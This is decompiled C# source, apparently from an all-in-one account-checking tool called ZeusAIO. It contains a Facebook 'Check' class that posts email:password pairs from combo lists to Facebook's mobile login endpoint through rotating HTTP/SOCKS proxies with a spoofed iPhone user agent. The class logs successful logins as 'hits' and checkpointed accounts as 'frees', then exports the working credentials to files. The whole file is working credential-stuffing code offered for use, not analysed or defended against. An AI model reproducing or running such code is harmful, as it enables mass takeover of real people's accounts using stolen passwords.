// Decompiled with JetBrains decompiler
// Type: Facebook.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Facebook
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "m_ts=1550180232&li=iN9lXBSfEc8xIHSKjFOe2vkx&try_number=0&unrecognized_tries=0&email=" + s[0] + "&pass=" + s[1] + "&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&had_cp_prefilled=false&had_password_prefilled=false&is_smart_lock=false&m_sess=&fb_dtsg=AQF6C0mj3hNf%3AAQGjTNnbLzLJ&jazoest=22034&lsd=AVri6wcw&__dyn=0wzp5Bwk8aU4ifDgy79pk2m3q12wAxu13w9y1DxW0Oohx61rwf24o29wmU3XwIwk9E4W0om783pwbO0o2US1kw5Kxmayo&__req=9&__ajax__=AYkbGOHTAqPBWedhRIHfEH-kFiBJmDdmTayxDqjTS3OQBinpNmq9rxYX3qOAArwuR2Byhhz4HJlxUBSye6VR7b6k2h4OiJeYukTQr8fy1wnR6A&__user=0";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100", str1, "application/x-www-form-urlencoded").ToString();
              if (!str2.Contains("provided_or_soft_matched") && !str2.Contains("oauth_login_elem_payload"))
              {
                if (str2.Contains("checkpoint"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - FACEBOOK] " + s[0] + ":" + s[1], Color.OrangeRed);
                  Export.AsResult("/Facebook_frees", s[0] + ":" + s[1]);
                  return false;
                }
                if (str2.Contains("save-device"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - FACEBOOK] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/Facebook_hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
